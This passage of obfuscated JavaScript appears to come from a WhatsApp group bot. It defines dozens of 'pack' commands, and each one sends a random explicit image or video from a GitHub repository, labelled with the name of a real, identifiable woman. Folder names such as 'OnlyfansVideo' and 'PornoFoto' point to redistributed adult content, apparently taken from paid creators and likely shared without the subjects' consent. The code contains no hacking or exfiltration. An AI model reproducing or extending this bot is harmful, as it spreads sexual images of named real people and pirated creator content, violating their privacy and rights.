                  '19': _0x141936 + "packmaruk",
                  '20': _0x141936 + "packmcpri",
                  '21': _0x141936 + "packme1adinha",
                  '22': _0x141936 + "packnathb",
                  '23': _0x141936 + "packnegab",
                  '24': _0x141936 + "packpolonesa",
                  '25': _0x141936 + "packruter",
                  '26': _0x141936 + "packvitac",
                  '27': _0x141936 + "packcarniello",
                  '28': _0x141936 + "packnetersg",
                  '29': _0x141936 + "packegrils",
                  '30': _0x141936 + "packegrilv",
                  '31': _0x141936 + "packaleatoriasi",
                  '32': _0x141936 + "packaleatoriosv",
                  '33': _0x141936 + "packonlyvid",
                  '34': _0x141936 + "packamadorv"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0xc9b955
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                let _0x2d833b = "🇱 🇮 🇸 🇹 🇦  🇩 🇪  🇵 🇦 🇨 🇰 🇸 :\n\n" + lermais + "1. 🔞 Alinne Faria 🔞\n" + "2. 🔞 Alinne Fox 🔞\n" + "3. 🔞 Tati 🔞\n" + "4. 🔞 Alycia Ribeiro 🔞\n" + "5. 🔞 Amiichan 🔞\n" + "6. 🔞 Aninha Lopes 🔞\n" + "7. 🔞 Babymatoso 🔞\n" + "8. 🔞 Belle Delphine 🔞\n" + "9. 🔞 Brenda T 🔞\n" + "10. 🔞 Cami Brito 🔞\n" + "11. 🔞 CC Clowniac 🔞\n" + "12. 🔞 FehG 🔞\n" + "13. 🔞 Giovanna C 🔞\n" + "14. 🔞 Isadora M 🔞\n" + "15. 🔞 Isa W 🔞\n" + "16. 🔞 Lay N 🔞\n" + "17. 🔞 Leticia Shiryuki 🔞\n" + "18. 🔞 Marina Mui 🔞\n" + "19. 🔞 Maru K 🔞\n" + "20. 🔞 Mc Pri 🔞\n" + "21. 🔞 Me1Adinha 🔞\n" + "22. 🔞 Nath B 🔞\n" + "23. 🔞 Nega B 🔞\n" + "24. 🔞 Polonesa Do Hype 🔞\n" + "25. 🔞 Ruter 🔞\n" + "26. 🔞 Vita C 🔞\n" + "27. 🔞 Carniello 🔞\n" + "28. 🔞 Neters G 🔞\n" + "29. 🔞 Egrils 🔞\n" + "30. 🔞 Egrilv 🔞\n" + "31. 🔞 Aleatorias I 🔞\n" + "32. 🔞 Aleatorios V 🔞\n" + "33. 🔞 Only Vid 🔞\n" + "34. 🔞 Amador V 🔞";
                const _0x4bc751 = {
                  text: _0x2d833b
                };
                const _0x2a046c = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4bc751, _0x2a046c);
              }
              break;
            case "packtati":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              blaLN = ["https://telegra.ph/file/4aa88fde6a9a0c4d61102.jpg", "https://telegra.ph/file/9eeb0f7bc9afc2731ff22.jpg", "https://telegra.ph/file/ef0b6ce4e2c899ea01ff8.jpg", "https://telegra.ph/file/c4bd09b331ccc1e12fb9c.jpg", "https://telegra.ph/file/96fc9eb08575c9a22c498.jpg", "https://telegra.ph/file/593eca5e3a1f9c6d895aa.jpg", "https://telegra.ph/file/485f2803285637f12a081.jpg", "https://telegra.ph/file/be117c443974cadf5ab6c.jpg", "https://telegra.ph/file/7fdb2f7f451fc6195e9c8.jpg", "https://telegra.ph/file/fc296210456dfd920f346.jpg", "https://telegra.ph/file/95cb025b1415556bee57c.jpg", "https://telegra.ph/file/6cb23e5c4ebfda58bd438.jpg", "https://telegra.ph/file/ea8736d9b00c1eb6b7bd4.jpg", "https://telegra.ph/file/11052b0a880ccc51508a0.jpg", "https://telegra.ph/file/4966bfa928987051bf7b0.jpg", "https://telegra.ph/file/ee7a1d65e3ca6ec8bdf01.jpg", "https://telegra.ph/file/b8ac4024047b5c94eb51e.jpg", "https://telegra.ph/file/a05435216298578a02fb6.jpg", "https://telegra.ph/file/0d0bd57946d44726150de.jpg", "https://telegra.ph/file/3660a90408018851f2cbb.jpg", "https://telegra.ph/file/f38d36c69e7b82898f9fe.jpg", "https://telegra.ph/file/ec14cad1b5d9182157398.jpg", "https://telegra.ph/file/f58610e6aef5a28602f33.jpg", "https://telegra.ph/file/020e19b0085bb6355bc4c.jpg", "https://telegra.ph/file/d001b034d73a756e45f91.jpg", "https://telegra.ph/file/c09247c599442fc4468b1.jpg", "https://telegra.ph/file/a73572dd1950f29bf4888.jpg", "https://telegra.ph/file/6bf465d785f468bbd2700.jpg", "https://telegra.ph/file/4ead35657b5d1b56a042a.jpg", "https://telegra.ph/file/3847012a38daa3ed56e25.jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥 𝐏𝐀𝐂𝐊 𝐓𝐀𝐓𝐈𝐙𝐀𝐐𝐔𝐈 🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packalinefaria":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 65) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/AlineFaria/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐀𝐋𝐈𝐍𝐄 𝐅𝐀𝐅𝐈𝐀🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packalinefox":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 60) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/AlineFox/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐀𝐋𝐈𝐍𝐄 𝐅𝐎𝐗🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packalycia":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 28) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/AlyciaRibeiro/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐀𝐋𝐘𝐂𝐈𝐀 𝐑𝐈𝐁𝐄𝐈𝐑𝐎🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packamiichan":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/Amiichan/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐀𝐌𝐈𝐈𝐂𝐇𝐀𝐍🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packaninhal":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/AninhaLopes/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐀𝐍𝐈𝐍𝐇𝐀 𝐋𝐎𝐏𝐄𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packbabymatoso":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 36) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/BabyMatoso/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐁𝐀𝐁𝐘 𝐌𝐀𝐓𝐎𝐒𝐎🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packbelledel":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 31) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/BelleDelphine/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐁𝐄𝐋𝐋𝐄 𝐃𝐄𝐋𝐏𝐇𝐈𝐍𝐄🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packbrendat":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 25) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/BrendaTrindade/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐁𝐑𝐄𝐍𝐃𝐀 𝐓𝐑𝐈𝐍𝐃𝐀𝐃𝐄🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packcamib":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/CamiBrito/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐂𝐀𝐌𝐈 𝐁𝐑𝐈𝐓𝐎🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packcclowniac":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 29) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/Cclowniac/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐂𝐂𝐋𝐎𝐖𝐍𝐈𝐀𝐂🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packfehg":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 32) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/FehGalvao/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐅𝐄𝐇 𝐆𝐀𝐋𝐕𝐀̃𝐎 🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packgiovannac":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 34) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/GiovannaCampomar/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐆𝐈𝐎𝐕𝐀𝐍𝐍𝐀 𝐂𝐀𝐌𝐏𝐎𝐌𝐀𝐑🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packisadoram":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/ISADORA%20MARTINEZ/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐈𝐒𝐀𝐃𝐎𝐑𝐀 𝐌𝐀𝐑𝐓𝐈𝐍𝐄𝐙🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packisaw":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 21) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/IsaWaifu/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐈𝐒𝐀 𝐖𝐀𝐈𝐅𝐔🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packlayn":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 25) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/LayNuniz/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐋𝐀𝐘 𝐍𝐔𝐍𝐈𝐙🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packleticias":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 28) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/LeticiaShirayuki/%20" + numbr + ".jpeg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐋𝐄𝐓𝐈𝐂𝐈𝐀 𝐒𝐇𝐈𝐑𝐀𝐘𝐔𝐊𝐈🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packmarinam":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 27) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/MarinaMui/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐌𝐀𝐑𝐈𝐍𝐀 𝐌𝐔𝐈🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packmaruk":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 40) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/MaruKarv/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐌𝐀𝐑𝐔 𝐊𝐀𝐑𝐕🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packmcpri":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 32) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/McPrincesa/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐌𝐂 𝐏𝐑𝐈𝐍𝐂𝐄𝐒𝐀🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packme1adinha":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 33) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/Me1adinha/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐌𝐄1𝐀𝐃𝐈𝐍𝐇𝐀🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packnathb":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 23) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/NathBister%C3%A7o/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐍𝐀𝐓𝐇 𝐁𝐈𝐒𝐓𝐄𝐑𝐂̧𝐎🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packnegab":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 21) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/NegaBarbie/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐍𝐄𝐆𝐀 𝐁𝐀𝐑𝐁𝐈𝐄🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packpolonesa":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 28) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/PolonesaDoHype/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐏𝐎𝐋𝐎𝐍𝐄𝐒𝐀 𝐃𝐎 𝐇𝐘𝐏𝐄🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packruter":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/RuteRocha/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐑𝐔𝐓𝐄 𝐑𝐎𝐂𝐇𝐀🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packvitac":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/VitaCelestine/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐕𝐈𝐓𝐀 𝐂𝐄𝐋𝐄𝐒𝐓𝐈𝐍𝐄🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packcarniello":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 29) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/carniello/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐂𝐀𝐑𝐍𝐈𝐄𝐋𝐋𝐎🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packnetersg":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 30) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/netersg/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐍𝐄𝐓𝐄𝐑𝐒𝐆🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packegrils":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 36) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/egril/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐄𝐆𝐑𝐈𝐋𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packaleatoriasi":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 44) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/PornoFoto/%20" + numbr + ".jpg"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3c2c3a(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐅𝐎𝐓𝐎𝐒 𝐀𝐋𝐄𝐀𝐓𝐎́𝐑𝐈𝐀𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packonlyvid":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 47) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/OnlyfansVideo/%20" + numbr + ".mp4"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3941ea(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐎𝐍𝐋𝐘𝐅𝐀𝐍𝐒 𝐕𝐈𝐃𝐄𝐎𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packaleatoriosv":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 37) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/PornoVideo/" + numbr + ".mp4"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3941ea(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐀𝐋𝐄𝐀𝐓𝐎́𝐑𝐈𝐎𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packegrilv":
